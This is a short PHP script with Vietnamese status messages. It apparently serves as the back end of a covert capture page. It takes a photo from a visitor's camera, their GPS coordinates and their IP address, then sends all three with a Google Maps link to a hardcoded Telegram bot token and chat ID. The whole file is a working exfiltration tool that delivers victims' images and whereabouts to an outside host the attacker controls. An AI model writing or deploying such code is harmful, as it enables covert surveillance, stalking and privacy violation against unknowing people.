<?php
$token = "8126668661:AAGn670QIEq-275shtOOs_3kqGHCZGkmhFk";
$chat_id = "-1002660861146";

if (isset($_POST['imageData'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $lat = $_POST['lat'] ?? 'Không xác định';
    $lon = $_POST['lon'] ?? 'Không xác định';

    $imgData = str_replace('data:image/png;base64,', '', $_POST['imageData']);
    $imgData = str_replace(' ', '+', $imgData);
    $image = base64_decode($imgData);

    $file = tempnam(sys_get_temp_dir(), 'cam') . ".png";
    file_put_contents($file, $image);

    $caption = "📸 Ảnh mới:\n🧭 GPS: $lat, $lon\n🌐 IP: $ip\n🔗 Google Maps: https://maps.google.com/?q=$lat,$lon";

    $post = [
        'chat_id' => $chat_id,
        'caption' => $caption,
        'photo' => new CURLFile($file)
    ];

    $ch = curl_init("https://api.telegram.org/bot$token/sendPhoto");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_exec($ch);
    curl_close($ch);

    unlink($file);
    echo "✅ Đã gửi ảnh + GPS + IP về Telegram!";
} else {
    echo "❌ Không có dữ liệu gửi đi.";
}
?>
